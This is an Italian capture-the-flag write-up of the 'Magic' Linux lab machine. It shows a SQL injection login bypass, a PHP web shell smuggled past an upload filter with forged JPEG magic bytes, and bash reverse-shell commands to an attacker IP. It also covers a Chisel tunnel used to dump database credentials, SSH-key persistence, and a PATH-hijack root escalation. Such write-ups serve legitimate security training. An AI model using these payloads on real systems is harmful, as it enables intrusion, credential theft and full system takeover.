+++
date = '2026-09-06T20:37:29+02:00'
draft = false
title = 'Magic Writeup IT'
+++
**Autore:** **`joy.scd01`**

**Data:** **`08/03/2025`**

![pwn.png](/images/imgs_magic/pwn.png)

---
# Introduzione

_**Magic**_ è una macchina **Linux** di livello **Medium** che evidenzia l'importanza della validazione degli input e della gestione dell'upload di file.

In questo scenario, l'accesso iniziale viene ottenuto bypassando un form di login tramite **SQL Injection**, seguita da un **Arbitrary File Upload** che sfrutta una tecnica di manipolazione dei **Magic Bytes** per caricare una web shell in **PHP**.

Il lateral movement prevede il pivoting verso un database interno utilizzando **Chisel** per il port forwarding, al fine di estrarre le credenziali utente. Infine, la privilege escalation si ottiene sfruttando un binario **SUID** vulnerabile a **PATH Hijacking**, portando alla compromissione totale del sistema.

---
# Tecniche Utilizzate

- **Authentication Bypass (SQL Injection)**
- **Arbitrary File Upload (Magic Bytes Bypass) → RCE**
- **Local Port Forwarding (Chisel) → Database Dump**
- **SUID Binary Exploitation → PATH Hijacking**

---
# Enumerazione

## nmap

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV magic
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Porte Aperte**:

- **22**/tcp - SSH

- **80**/tcp - HTTP

## HTTP - Enumerazione Web 

Visitando la porta 80, era hostata una pagina web "**Magic Portfolio**".

![web1.png](/images/imgs_magic/web1.png)

Non c'erano molte funzionalità esposte, ad eccezione di un form di login in basso a sinistra. Mentre analizzavo l'applicazione, ho lanciato in background una scansione sulle directory con **gobuster** e una scansione per i vhost con **ffuf**.

![login.png](/images/imgs_magic/login.png)

Ho iniziato a testare il login form con semplici combinazioni username:password e payload **SQLi**. Inizialmente, nulla sembrava funzionare. Cambiando l'attributo **`type="password"`** nell'**HTML** in **`type="text"`** per vedere cosa stavo digitando, ho notato che il frontend bloccava l'inserimento degli spazi.

Per aggirare questa restrizione lato client, ho aperto **Burp Suite**, intercettato la richiesta di login e iniettato un payload **SQLi URL-encoded** direttamente nel campo della password: **`'+OR+1%3d1--+-`**.

L'injection è andata a buon fine e ho effettuato l'accesso all'applicazione.

---
# Accesso Iniziale | File Upload Bypass → www-data

Dopo il login, era presente un form per l'upload di immagini.

Ho tentato di caricare una semplice **web shell** in **PHP** chiamata **`ci.php`**:

```php
<?php system($_REQUEST['cmd']) ?>
```

L'applicazione ha restituito un errore:
- **`"Sorry, only JPG, JPEG & PNG files are allowed."`**

![burp1.png](/images/imgs_magic/burp1.png)

Ho provato a bypassare il filtro sulle estensioni aggiungendo **`.jpg`** al mio file (**`ci.php.jpg`**). Questo ha scatenato un errore diverso:
- **`"What are you trying to do there?".`**

![burp2.png](/images/imgs_magic/burp2.png)

Modificare il **`Content-Type`** nella richiesta **HTTP** in **`image/jpg`** ha portato allo stesso fallimento.

**Nota**: _A questo punto, era chiaro che l'applicazione stava ispezionando il contenuto del file, verosimilmente controllando i "**Magic Bytes**" all'inizio del file per verificarne il tipo effettivo. Il fatto che la macchina si chiamasse "**Magic**" era un ottimo indizio._

Per bypassare il controllo, dovevo falsificare un header **JPEG** valido. Ho preso un file **`sample.jpg`** legittimo e ho recuperato i suoi primi **20 byte** utilizzando **`xxd`**:

```bash
head -c 20 sample.jpg | xxd
```

Ho quindi anteposto quegli specifici **magic bytes JPEG** (**`ffd8ffe000104a464946000101010048`**) al mio payload **PHP** e l'ho salvato come **`ci.php.jpg`**:

```bash
echo 'ffd8ffe000104a464946000101010048' | xxd -p -r > ci.php.jpg
cat ci.php >> ci.php.jpg
```

![magic.png](/images/imgs_magic/magic.png)

L'upload di questo nuovo file contraffatto è andato a buon fine.

![upload.png](/images/imgs_magic/upload.png)

Ora dovevo trovare dove venissero archiviati gli upload. Le mie precedenti scansioni con **gobuster** avevano evidenziato una directory **`/images`** (che restituiva un **302 Forbidden**). Ho lanciato un'altra scansione mirata contro la directory **`/images`** e ho trovato **`/images/uploads`**.

Navigandoci ho confermato la **code execution**:

```text
http://magic/images/uploads/ci.php.jpg?cmd=id
```

![ce.png](/images/imgs_magic/ce.png)

Ho impostato un listener **netcat** e ho inviato un payload per la reverse shell bash **URL-encoded**:

```text
http://magic/images/uploads/ci.php.jpg?cmd=bash+-c+%27bash+-i+>%26+/dev/tcp/10.10.15.152/22667+0>%261%27
```

![initial.png](/images/imgs_magic/initial.png)

Ho ottenuto una shell come **`www-data`**.

---
# Lateral Movement | Chisel & Database Dump → theseus

Esplorando il filesystem come **`www-data`**, ho trovato un file di configurazione del database all'interno della directory **`/var/www/Magic`** contenente delle credenziali.

![lateral1.png](/images/imgs_magic/lateral1.png)

Ho tentato di usare queste credenziali per passare direttamente all'utente **`theseus`** tramite su, ma l'autenticazione è fallita.

![lateral_fail.png](/images/imgs_magic/lateral_fail.png)

Il mio passo logico successivo era connettermi al database per enumerare altre tabelle o hash. Tuttavia, né i client **mysql** né **sqlite3** erano installati sulla macchina target.

![dbfail.png](/images/imgs_magic/dbfail.png)

Per aggirare questa restrizione e creare un tunnel per la porta interna (**`3306`**) direttamente verso la mia macchina, ho trasferito il binario di **Chisel** sul target e ho impostato un reverse tunnel.

Sulla mia macchina attaccante (**`server`**):

```bash
chisel server -p 8000 --reverse
```

Sulla macchina target (**`client`**):

```bash
./chisel client 10.10.15.152:8000 R:3306:127.0.0.1:3306
```

Mi sono connesso al database utilizzando il mio client **MySQL** locale:

```bash
mysql -h 127.0.0.1 -P 3306 -u theseus -p
```

![db1.png](/images/imgs_magic/db1.png)

Mi sono autenticato, ho effettuato il dump della tabella **`login`** all'interno del database **`Magic`** e ho recuperato la password corretta per **`theseus`**.

```SQL
show databases;
use Magic;
show tables;
select * from login;
```

![db2.png](/images/imgs_magic/db2.png)

Ho provato a connettermi via **SSH** usando la nuova password, ma il server accettava solo l'autenticazione tramite chiave pubblica.

![sshfail.png](/images/imgs_magic/sshfail.png)

Per aggirare il problema, ho cambiato utente (**`su theseus`**) direttamente dalla mia shell **`www-data`** esistente. Una volta loggato come **`theseus`**, ho recuperato la **user flag**, ho aggiunto la mia chiave **SSH** pubblica al file **`/home/theseus/.ssh/authorized_keys`** e ho ottenuto una sessione **SSH** stabile e persistente.

![userf.png](/images/imgs_magic/userf.png)

---
# Privilege Escalation | SUID Binary → PATH Hijacking → root

Ho iniziato la mia enumerazione manuale interna e, cercando binari con il bit **SUID** impostato:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![suid.png](/images/imgs_magic/suid.png)

Ho identificato un binario insolito: **`/bin/sysinfo`**.

Ho cercato su **GTFOBins** e repository online, ma sembrava essere un eseguibile custom. Per capire cosa stesse facendo sotto il cofano, l'ho analizzato a **livello binario** utilizzando **`strings`**:

```bash
strings /bin/sysinfo
```

![strings.png](/images/imgs_magic/strings.png)

L'output ha rivelato che il binario richiamava comandi di sistema come **`fdisk`**, **`cat`**, **`free`**, ecc. senza specificarne i **percorsi assoluti** (richiamando **`fdisk`** invece di **`/sbin/fdisk`**).

**Nota**: _Se un binario richiama un eseguibile senza specificarne il **percorso assoluto**, il sistema lo cerca controllando le directory elencate nella variabile d'ambiente **`$PATH`** in ordine, da sinistra a destra. Anteponendo una nostra directory (es. **`/tmp`**) al **`$PATH`** e posizionandovi all'interno un eseguibile malevolo con lo stesso identico nome del comando richiesto, il sistema eseguirà il nostro payload al posto del binario legittimo._

Per exploitare questo **PATH Hijacking**, mi sono quindi spostato nella directory **`/tmp`** e ho modificato la variabile d'ambiente:

```bash
export PATH=/tmp:$PATH
```

![hijack.png](/images/imgs_magic/hijack.png)

Controllando **`echo $PATH`** ho confermato che **`/tmp`** era ora la prima directory nella stringa del path.
Successivamente, ho creato un file malevolo chiamato **`fdisk`** contenente un payload per una reverse shell:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.15.152/22667 0>&1'
```

L'ho reso eseguibile (**`chmod +x fdisk`**), ho impostato un listener **netcat** sulla mia macchina attaccante e ho eseguito il binario **SUID**:

```bash
sysinfo
```

Il binario ha tentato di richiamare **`fdisk`** come **root**, ha trovato prima il mio script malevolo in **`/tmp`** e ha eseguito la reverse shell.

![rootf.png](/images/imgs_magic/rootf.png)

Ho ottenuto con successo una shell **root**. La **root flag** si trovava in **`/root`**.

---
# Considerazioni Finali

Un gran bel box che si concentra su tecniche che non si vedono tutti i giorni, ma che sono realistiche al 100% e fondamentali da conoscere. Bypassare le restrizioni di upload dei file tramite lo spoofing dei **Magic Bytes** è un classico scenario del mondo reale, poiché molte web app si affidano alle firme dei file piuttosto che alle sole estensioni. Il movimento laterale con **Chisel** è stato un bel tocco, e la privilege escalation via **PATH Hijacking** su un binario **SUID** è un'errata configurazione da manuale.